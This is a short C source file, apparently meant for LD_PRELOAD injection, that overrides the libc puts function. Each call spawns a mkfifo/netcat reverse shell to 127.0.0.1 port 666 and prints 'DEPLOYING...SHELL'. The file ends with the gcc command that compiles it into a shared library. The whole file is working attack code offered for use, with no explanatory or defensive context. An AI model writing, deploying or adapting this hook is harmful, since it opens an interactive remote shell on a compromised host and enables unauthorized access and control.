#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
int puts(const char *message){
int(*new_puts)(const char *message);
new_puts = dlsym(RTLD_NEXT, "puts");
execl("/bin/sh", "sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 666>/tmp/f", (char *) NULL);
return new_puts("DEPLOYING...SHELL");}

# gcc hook.c -o hook.so -fPIC -shared -ldl -D_GNU_SOURCE
